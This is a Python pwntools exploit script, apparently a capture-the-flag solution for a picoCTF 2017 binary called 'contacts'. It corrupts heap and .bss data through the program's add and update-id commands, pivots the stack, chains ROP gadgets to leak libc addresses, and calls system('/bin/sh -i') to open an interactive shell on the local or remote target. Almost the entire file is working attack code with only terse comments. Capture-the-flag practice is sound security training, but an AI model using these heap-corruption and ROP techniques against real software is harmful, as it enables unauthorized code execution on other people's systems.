#!/usr/bin/env python
#
# @author GuilT
#

from pwn import *
import sys

PROMPT = '$ '

def exploit(con):
    con.recvuntil(PROMPT)
    
    def get(id):
        con.sendline('get %d' % id)
        res = con.recvuntil(PROMPT)[:-len(PROMPT)]
        return res
        
    def find(username):
        con.sendline('find %s' % username)
        res = con.recvuntil(PROMPT)[:-len(PROMPT)]
        return res
        
    def update_id(username, newid):
        con.sendline('update-id %s %d' % (username, newid))
        res = con.recvuntil(PROMPT)[:-len(PROMPT)]
        return res
        
    def update_phone(id, newphone):
        con.sendline('update-phone %d %s' % (id, newphone))
        res = con.recvuntil(PROMPT)[:-len(PROMPT)]
        return res
        
    def add(id, username, phone):
        con.sendline('add %d %s %s' % (id, username, phone))
        res = con.recvuntil(PROMPT)[:-len(PROMPT)]
        return res
        
    def exit_mode(mode):
        allowedmodes = ('default', 'save', 'goodbye')
        if mode not in allowedmodes:
            log.failure('exit-mode must be one of the following: ' + str(allowedmodes))
        con.sendline('exit-mode %s' % mode)
        res = con.recvuntil(PROMPT)[:-len(PROMPT)]
        return res
        
    def quit():
        con.sendline('quit')
        
        
       
    #for i in xrange(0x1fc):
    for i in xrange(0x40-1):
        add(i+0x100, hex(i+0x100), '1234567890')
        
    #1 free contact 2 called "2"... it will fail but it will free
    #1b The free chunk will go on the fast list
    print add(0x102,"0x102", '123456')
    print add(0x103,"0x103", '123456')
    #2 update its id so that it points to the data struct on bss
    print update_id("0x102", 0x602F30)

    #3 add a new contact so that new contact copies stuff in the temp struct
    print add(0x200,'AAAAAAAAAAAAAAAA', '1234567890')
    print add(0x201,'BBBBBBBBBBBBBBBB', '1234567890')
    print add(0x202,'CCCCCCCCCCCCCCCC', '1234567890')
    print add(0x40142c,'DDDDDDDDDDDDDDDD', '1234567890') #clobbers data
    
    update_id('AAAAAAAAAAAAAAAA', 0x40142d)  #: pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
    
    #4 at this point im in control of eip and the stack so its a normal ropchain...
    from roputils import ROP
    rop = ROP('./contacts')
    addr_stage = 0x6022F0   #somwhere on the .bss
    ptr_ret = rop.search(rop.section('.fini'))
    log.info('addr_stage @ 0x%x' % addr_stage)

    
    log.info('sending stage 1')
    
    buf = rop.retfill(0)
    buf += rop.call_chain_ptr(
        ['puts', 0x601e88],  #leak setvbuf_got
        ['puts', 0x602F78])  #leak stdin
    buf += p64(0x400e69)     #replay main
    
    con.sendline('quit\x00' + cyclic(19) + buf)
    
    setvbuf_addr  = u64(con.recvline()[:-1].ljust(8, '\x00'))
    stdin = u64(con.recvline()[:-1].ljust(8, '\x00'))
    
    log.success('setvbuf_addr @ 0x%x' % setvbuf_addr)
    log.success('stdin @ 0x%x' % stdin)
    
    system_addr = setvbuf_addr - 0x30be0

    raw_input()
    log.info('sending stage 2')
    print update_id('AAAAAAAAAAAAAAAA', 0x40142d)
    
    buf = rop.retfill(0)
    buf += rop.call_chain_ptr(
        ['fgets', addr_stage, 33, stdin]
    , pivot=addr_stage)
    
    buf = buf[:-8] +  p64(0x400c8f) #alternate leave; ret
    con.sendline('quit\x00' + cyclic(19) + buf)
    
    
    log.info('sending stage 3')
    buf = ''
    buf += p64(0x401433) # : pop rdi ; ret
    buf += p64(addr_stage+0x18)
    buf += p64(system_addr)
    buf += '/bin/sh -i\x00'
       
    newline = buf.find('\n')
    
    con.sendline(buf)
    con.interactive()


if __name__ == '__main__':
    if len(sys.argv) > 1:
        conn = remote('shell2017.picoctf.com',13890)
    else:
        conn = process('contacts')
        gdb.attach(conn)
        
    exploit(conn)